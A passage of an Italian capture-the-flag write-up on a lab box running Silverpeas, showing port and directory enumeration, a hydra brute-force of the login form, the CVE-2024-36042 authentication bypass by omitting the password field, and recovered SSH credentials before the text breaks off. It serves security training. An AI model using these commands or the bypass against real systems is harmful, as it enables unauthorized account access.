+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22"></a><span class="p">|</span><span class="w">     </span>Content-Length:<span class="w"> </span><span class="m">0</span>
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23"></a><span class="p">|</span>_<span class="w">    </span>Connection:<span class="w"> </span>close
+</span></code></pre></div></td></tr></table></div>
+<p>Abbiamo quindi tre servizi:</p>
+<ul>
+<li>SSH (port 22) versione w</li>
+<li>http (port 80) nginx 1.18.0, si occupa quindi di smistare le richieste</li>
+<li>http-proxy (port 8080) da prendere con le pinze, nmap non ha riconosciuto il servizio.</li>
+</ul>
+<p>Visitando <code>silver.local</code> otteniamo una pagina costruita con <strong>Dimension by HTML5 UP.</strong></p>
+<p>Usiamo <strong>ffuf</strong> per cercare altri file/sotto directory</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-2-10">10</a></span>
+<span class="normal"><a href="#__codelineno-2-11">11</a></span>
+<span class="normal"><a href="#__codelineno-2-12">12</a></span>
+<span class="normal"><a href="#__codelineno-2-13">13</a></span>
+<span class="normal"><a href="#__codelineno-2-14">14</a></span>
+<span class="normal"><a href="#__codelineno-2-15">15</a></span>
+<span class="normal"><a href="#__codelineno-2-16">16</a></span>
+<span class="normal"><a href="#__codelineno-2-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>kali@kali:~$<span class="w"> </span>ffuf<span class="w"> </span>-u<span class="w"> </span>http://silver.local/FUZZ<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/common.txt<span class="w"> </span>-e<span class="w"> </span>.txt,.md,.bak<span class="w">  </span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="w">        </span>/<span class="s1">'___\  /'</span>___<span class="se">\ </span><span class="w">          </span>/<span class="err">'</span>___<span class="se">\ </span><span class="w">      </span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a><span class="w">       </span>/<span class="se">\ \_</span>_/<span class="w"> </span>/<span class="se">\ \_</span>_/<span class="w">  </span>__<span class="w">  </span>__<span class="w">  </span>/<span class="se">\ \_</span>_/<span class="w">       </span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="w">       </span><span class="se">\ \ </span>,__<span class="se">\\</span><span class="w"> </span><span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span><span class="w">     </span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a><span class="w">        </span><span class="se">\ \ \_</span>/<span class="w"> </span><span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/<span class="w">      </span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a><span class="w">         </span><span class="se">\ \_\ </span><span class="w">  </span><span class="se">\ \_\ </span><span class="w"> </span><span class="se">\ \_</span>___/<span class="w">  </span><span class="se">\ \_\ </span><span class="w">      </span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a><span class="w">          </span><span class="se">\/</span>_/<span class="w">    </span><span class="se">\/</span>_/<span class="w">   </span><span class="se">\/</span>___/<span class="w">    </span><span class="se">\/</span>_/<span class="w">       </span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10"></a><span class="w">       </span>v2.3.0
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11"></a>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12"></a>LICENSE.txt<span class="w">             </span><span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">17128</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">2798</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">64</span>,<span class="w"> </span>Duration:<span class="w"> </span>25ms<span class="o">]</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13"></a>README.txt<span class="w">              </span><span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">771</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">91</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">30</span>,<span class="w"> </span>Duration:<span class="w"> </span>26ms<span class="o">]</span>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14"></a>assets<span class="w">                  </span><span class="o">[</span>Status:<span class="w"> </span><span class="m">301</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">178</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">6</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">8</span>,<span class="w"> </span>Duration:<span class="w"> </span>25ms<span class="o">]</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15"></a>images<span class="w">                  </span><span class="o">[</span>Status:<span class="w"> </span><span class="m">301</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">178</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">6</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">8</span>,<span class="w"> </span>Duration:<span class="w"> </span>26ms<span class="o">]</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16"></a>index.html<span class="w">              </span><span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">14124</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">926</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">346</span>,<span class="w"> </span>Duration:<span class="w"> </span>32ms<span class="o">]</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17"></a>::<span class="w"> </span>Progress:<span class="w"> </span><span class="o">[</span><span class="m">19000</span>/19000<span class="o">]</span><span class="w"> </span>::<span class="w"> </span>Job<span class="w"> </span><span class="o">[</span><span class="m">1</span>/1<span class="o">]</span><span class="w"> </span>::<span class="w"> </span><span class="m">1388</span><span class="w"> </span>req/sec<span class="w"> </span>::<span class="w"> </span>Duration:<span class="w"> </span><span class="o">[</span><span class="m">0</span>:00:13<span class="o">]</span><span class="w"> </span>::<span class="w"> </span>Errors:<span class="w"> </span><span class="m">0</span><span class="w"> </span>::
+</span></code></pre></div></td></tr></table></div>
+<p>Sembra non esserci nulla di rilevante. proviamo a fare una ricerca per sub-domain:</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>kali@kali:~$<span class="w"> </span>ffuf<span class="w"> </span>-u<span class="w"> </span>http://silver.local<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Host: FUZZ.silver.local"</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span>-fs<span class="w"> </span><span class="m">14124</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Non restituisce nessun risultato.</p>
+<p>Abbiamo anche un altro servizio <strong>http</strong> posisamo provare ad enumerare anche lì</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>kali@kali:~$<span class="w"> </span>ffuf<span class="w"> </span>-u<span class="w"> </span>http://silver.local:8080/FUZZ<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/common.txt<span class="w"> </span>-e<span class="w"> </span>.txt,.md,.bak<span class="w">                         </span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>console<span class="w">                 </span><span class="o">[</span>Status:<span class="w"> </span><span class="m">302</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">0</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>Duration:<span class="w"> </span>41ms<span class="o">]</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>website<span class="w">                 </span><span class="o">[</span>Status:<span class="w"> </span><span class="m">302</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">0</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>Duration:<span class="w"> </span>101ms<span class="o">]</span>
+</span></code></pre></div></td></tr></table></div>
+<p><code>console/</code> fa un redirect a <code>noredirect.html</code> </p>
+<p><code>website/</code> invece da <strong>errore 403: Forbidden.</strong></p>
+<p>Ho notato un pattern strano nella richiesta verso <code>silver.local:8080/website</code> infatti, usando <strong>curl</strong> e modificando l’header <code>Host</code> ho notato come ciò che è nell’header (cioè il suo valore) viene rispecchiato all’url a cui punta.</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span>
+<span class="normal"><a href="#__codelineno-5-3">3</a></span>
+<span class="normal"><a href="#__codelineno-5-4">4</a></span>
+<span class="normal"><a href="#__codelineno-5-5">5</a></span>
+<span class="normal"><a href="#__codelineno-5-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>kali@kali:~$<span class="w"> </span>curl<span class="w"> </span>-i<span class="w"> </span>http://silver.local:8080/website<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Host: silver.local:8080/test"</span><span class="w"> </span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>HTTP/1.1<span class="w"> </span><span class="m">302</span><span class="w"> </span>Found
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>Connection:<span class="w"> </span>keep-alive
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a>Location:<span class="w"> </span>http://silver.local:8080/test/website/
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a>Content-Length:<span class="w"> </span><span class="m">0</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a>Date:<span class="w"> </span>Fri,<span class="w"> </span><span class="m">06</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">2026</span><span class="w"> </span><span class="m">15</span>:58:38<span class="w"> </span>GMT
+</span></code></pre></div></td></tr></table></div>
+<p>Vediamo quindi che prende il valore del header <code>Host</code> e ci appende <code>/website</code> questo website potremmo invalidarlo con un qualcosa come <code>Host: silver.local:8080/path?0=</code></p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-6-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-6-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-6-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-6-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-6-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-6-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-6-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-6-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-6-10">10</a></span>
+<span class="normal"><a href="#__codelineno-6-11">11</a></span>
+<span class="normal"><a href="#__codelineno-6-12">12</a></span>
+<span class="normal"><a href="#__codelineno-6-13">13</a></span>
+<span class="normal"><a href="#__codelineno-6-14">14</a></span>
+<span class="normal"><a href="#__codelineno-6-15">15</a></span>
+<span class="normal"><a href="#__codelineno-6-16">16</a></span>
+<span class="normal"><a href="#__codelineno-6-17">17</a></span>
+<span class="normal"><a href="#__codelineno-6-18">18</a></span>
+<span class="normal"><a href="#__codelineno-6-19">19</a></span>
+<span class="normal"><a href="#__codelineno-6-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>kali@kali:~$<span class="w"> </span>curl<span class="w"> </span>-i<span class="w"> </span>http://silver.local:8080/website<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Host: silver.local:8080/console?0="</span><span class="w"> </span>-L
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>HTTP/1.1<span class="w"> </span><span class="m">302</span><span class="w"> </span>Found
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>Connection:<span class="w"> </span>keep-alive
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a>Location:<span class="w"> </span>http://silver.local:8080/console?0<span class="o">=</span>/website/
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a>Content-Length:<span class="w"> </span><span class="m">0</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a>Date:<span class="w"> </span>Fri,<span class="w"> </span><span class="m">06</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">2026</span><span class="w"> </span><span class="m">16</span>:12:44<span class="w"> </span>GMT
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7"></a>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8"></a>HTTP/1.1<span class="w"> </span><span class="m">302</span><span class="w"> </span>Found
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9"></a>Connection:<span class="w"> </span>keep-alive
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10"></a>Location:<span class="w"> </span>/noredirect.html
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11"></a>Content-Length:<span class="w"> </span><span class="m">0</span>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12"></a>Date:<span class="w"> </span>Fri,<span class="w"> </span><span class="m">06</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">2026</span><span class="w"> </span><span class="m">16</span>:12:44<span class="w"> </span>GMT
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13"></a>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14"></a>HTTP/1.1<span class="w"> </span><span class="m">404</span><span class="w"> </span>Not<span class="w"> </span>Found
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15"></a>Connection:<span class="w"> </span>keep-alive
+</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16"></a>Content-Length:<span class="w"> </span><span class="m">74</span>
+</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17"></a>Content-Type:<span class="w"> </span>text/html
+</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18"></a>Date:<span class="w"> </span>Fri,<span class="w"> </span><span class="m">06</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">2026</span><span class="w"> </span><span class="m">16</span>:12:44<span class="w"> </span>GMT
+</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19"></a>
+</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20"></a>&lt;html&gt;&lt;head&gt;&lt;title&gt;Error&lt;/title&gt;&lt;/head&gt;&lt;body&gt;404<span class="w"> </span>-<span class="w"> </span>Not<span class="w"> </span>Found&lt;/body&gt;&lt;/html&gt;<span class="w">     </span>
+</span></code></pre></div></td></tr></table></div>
+<p>Ma probabilmente stiamo nella direzione sbagliata. riguardando il sito principale nella scheda contact notiamo un nickname: <code>scr1ptkiddy</code> dove viene detto di contattarlo su <code>silverpeas</code> , supponendo <code>silverpeas</code> sia proprio<code>silver.local:8080</code> proviamo a raggiungere <code>http://silver.local:8080/silverpeas</code> con un ottimo risultato!</p>
+<p><img alt="image.png" src="../assets/silver-platter/image.png" /></p>
+<p>Ora sappiamo che, l’utente si chiama <code>scr1ptkiddy</code> ma non conosciamo la password, leggendo la guida della <strong>CTF</strong> viene espressamente detto che la password non è in <code>rockyou.txt</code> quindi probabilmente dobbiamo costruire un dizionario custom. Creo quindi partendo dalla pagina iniziale <code>silver.local:80</code> usando il tool <strong>cewl</strong> un dizionario di possibili password.</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-7-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-7-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-7-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-7-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-7-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-7-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-7-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-7-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-7-10">10</a></span>
+<span class="normal"><a href="#__codelineno-7-11">11</a></span>
+<span class="normal"><a href="#__codelineno-7-12">12</a></span>
+<span class="normal"><a href="#__codelineno-7-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>kali@kali:~/Desktop/CTF/SilverPlatter$<span class="w"> </span>cewl<span class="w"> </span>http://silver.local<span class="w"> </span>-d<span class="w"> </span><span class="m">3</span><span class="w"> </span>-m<span class="w"> </span><span class="m">4</span><span class="w"> </span>-w<span class="w"> </span>wordlist1.txt<span class="w"> </span>--with-numbers
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>CeWL<span class="w"> </span><span class="m">6</span>.2.1<span class="w"> </span><span class="o">(</span>More<span class="w"> </span>Fixes<span class="o">)</span><span class="w"> </span>Robin<span class="w"> </span>Wood<span class="w"> </span><span class="o">(</span>robin@digi.ninja<span class="o">)</span><span class="w"> </span><span class="o">(</span>https://digi.ninja/<span class="o">)</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a>kali@kali:~/Desktop/CTF/SilverPlatter$<span class="w"> </span>cat<span class="w"> </span>wordlist1.txt<span class="w">                                                 </span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a>Item
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6"></a>Security
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7"></a>Hack
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8"></a>Smarter
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9"></a>Default
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10"></a>this
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11"></a>adipiscing
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12"></a>aliquet
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13"></a><span class="o">[</span>....<span class="o">]</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Ed eseguo il bruteforce sulla pagina</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-8-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-8-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-8-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-8-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-8-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-8-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-8-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-8-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-8-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>kali@kali:~/Desktop/CTF/SilverPlatter$<span class="w"> </span>hydra<span class="w"> </span>-l<span class="w"> </span><span class="s2">"scr1ptkiddy"</span><span class="w"> </span>-P<span class="w"> </span>wordlist1.txt<span class="w"> </span>silver.local<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">"/silverpeas/AuthenticationServlet:Login=^USER^&amp;Password=^PASS^&amp;DomainId=0:F=incorrect"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-w<span class="w"> </span><span class="m">5</span><span class="w"> </span>-s<span class="w"> </span><span class="m">8080</span><span class="w"> </span>-I
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>Hydra<span class="w"> </span>v9.7<span class="w"> </span><span class="o">(</span>c<span class="o">)</span><span class="w"> </span><span class="m">2023</span><span class="w"> </span>by<span class="w"> </span>van<span class="w"> </span>Hauser/THC<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>David<span class="w"> </span>Maciejak<span class="w"> </span>-<span class="w"> </span>Please<span class="w"> </span><span class="k">do</span><span class="w"> </span>not<span class="w"> </span>use<span class="w"> </span><span class="k">in</span><span class="w"> </span>military<span class="w"> </span>or<span class="w"> </span>secret<span class="w"> </span>service<span class="w"> </span>organizations,<span class="w"> </span>or<span class="w"> </span><span class="k">for</span><span class="w"> </span>illegal<span class="w"> </span>purposes<span class="w"> </span><span class="o">(</span>this<span class="w"> </span>is<span class="w"> </span>non-binding,<span class="w"> </span>these<span class="w"> </span>***<span class="w"> </span>ignore<span class="w"> </span>laws<span class="w"> </span>and<span class="w"> </span>ethics<span class="w"> </span>anyway<span class="o">)</span>.
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a>Hydra<span class="w"> </span><span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span><span class="w"> </span>starting<span class="w"> </span>at<span class="w"> </span><span class="m">2026</span>-11-06<span class="w"> </span><span class="m">11</span>:53:42
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a><span class="o">[</span>WARNING<span class="o">]</span><span class="w"> </span>Restorefile<span class="w"> </span><span class="o">(</span>ignored<span class="w"> </span>...<span class="o">)</span><span class="w"> </span>from<span class="w"> </span>a<span class="w"> </span>previous<span class="w"> </span>session<span class="w"> </span>found,<span class="w"> </span>to<span class="w"> </span>prevent<span class="w"> </span>overwriting,<span class="w"> </span>./hydra.restore
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6"></a><span class="o">[</span>DATA<span class="o">]</span><span class="w"> </span>max<span class="w"> </span><span class="m">4</span><span class="w"> </span>tasks<span class="w"> </span>per<span class="w"> </span><span class="m">1</span><span class="w"> </span>server,<span class="w"> </span>overall<span class="w"> </span><span class="m">4</span><span class="w"> </span>tasks,<span class="w"> </span><span class="m">311</span><span class="w"> </span>login<span class="w"> </span>tries<span class="w"> </span><span class="o">(</span>l:1/p:311<span class="o">)</span>,<span class="w"> </span>~78<span class="w"> </span>tries<span class="w"> </span>per<span class="w"> </span>task
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7"></a><span class="o">[</span>DATA<span class="o">]</span><span class="w"> </span>attacking<span class="w"> </span>http-post-form://silver.local:8080/silverpeas/AuthenticationServlet:Login<span class="o">=</span>^USER^<span class="p">&amp;</span><span class="nv">Password</span><span class="o">=</span>^PASS^<span class="p">&amp;</span><span class="nv">DomainId</span><span class="o">=</span><span class="m">0</span>:F<span class="o">=</span>incorrect
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8"></a><span class="o">[</span><span class="m">8080</span><span class="o">][</span>http-post-form<span class="o">]</span><span class="w"> </span>host:<span class="w"> </span>silver.local<span class="w">   </span>login:<span class="w"> </span>scr1ptkiddy<span class="w">   </span>password:<span class="w"> </span>adipiscing
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9"></a><span class="m">1</span><span class="w"> </span>of<span class="w"> </span><span class="m">1</span><span class="w"> </span>target<span class="w"> </span>successfully<span class="w"> </span>completed,<span class="w"> </span><span class="m">1</span><span class="w"> </span>valid<span class="w"> </span>password<span class="w"> </span>found
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10"></a>Hydra<span class="w"> </span><span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span><span class="w"> </span>finished<span class="w"> </span>at<span class="w"> </span><span class="m">2026</span>-11-06<span class="w"> </span><span class="m">11</span>:53:49
+</span></code></pre></div></td></tr></table></div>
+<p>La password è <code>adipiscing</code> </p>
+<p><img alt="image.png" src="../assets/silver-platter/image-1.png" /></p>
+<p>Sono dentro il portale di <strong>Silverpeas</strong> un progetto OpenSource scritto in java per creare una intranet aziendale</p>
+<p><img alt="image.png" src="../assets/silver-platter/image-2.png" /></p>
+<p>Altro utente da segnare: <code>Tyler</code> </p>
+<p><img alt="image.png" src="../assets/silver-platter/image-3.png" /></p>
+<p>Informazioni (forse) rilevanti dell’utente <strong>scr1ptkiddy.</strong></p>
+<p>L’utente scr1ptkiddy è un manager, lo possiamo capire aprendo la sezione <code>My Documents</code></p>
+<p><img alt="image.png" src="../assets/silver-platter/image-4.png" /></p>
+<p>Da questa pagina possiamo caricare documenti che una volta aperti vengono gestiti dal server.</p>
+<p><img alt="image.png" src="../assets/silver-platter/image-5.png" /></p>
+<p>Possiamo provare a caricare un payload in <strong>Java</strong> essendo <strong>Silverpeas</strong> basato su <strong>Java EE/JEE.</strong> No scherzone, non viene eseguito nessun codice…</p>
+<p><img alt="image.png" src="../assets/silver-platter/image-6.png" /></p>
+<p><img alt="image.png" src="../assets/silver-platter/image-7.png" /></p>
+<p>Cercando su internet ho scoperto di una vulnerabilità assolutamente stupida di Silverpeas, etichettata come <strong>CVE-2024-36042</strong> tale vulnerabilità permette, togliendo dalla richiesta di login il campo <code>Password</code> di loggarsi come qualsiasi utente. Sapendo questo, possiamo autenticarci come <strong>silveradmin@localhost</strong></p>
+<p>Prima:</p>
+<p><img alt="image.png" src="../assets/silver-platter/image-8.png" /></p>
+<p>Dopo</p>
+<p><img alt="image.png" src="../assets/silver-platter/image-9.png" /></p>
+<p><img alt="image.png" src="../assets/silver-platter/image-10.png" /></p>
+<p>Ho trovato un’altra falla pericolossissima tant’è che ha come score <strong>CVSS 9.9</strong> stiamo parlando della <strong>CVE-2018-19586</strong> che permette a un utente, manipolandno l’header <code>X-FULL-PATH</code>, a un utente standard di caricare un file <code>.jsp</code> malevolo.  Ma non sembra andare… molto probabilmente non è la strada giusta.</p>
+<p>Ritornando all’utente <strong>Administrator</strong> <em>(SilverAdmin)</em> guardando le sue notifiche in outbox, notiamo delle credenziali <strong>SSH</strong></p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>Username:<span class="w"> </span>tim
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>Password:<span class="w"> </span>cm0nt!md0ntf0rg3tth!spa<span class="nv">$$</span>w0rdagainlol
+</span></code></pre></div></td></tr></table></div>
+<p>Arrivati a questo punto possiamo facilmente accedere in SSH</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
+<span class="normal"><a href="#__codelineno-10-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>tim@ip-10-129-174-38:~$<span class="w"> </span>whoami
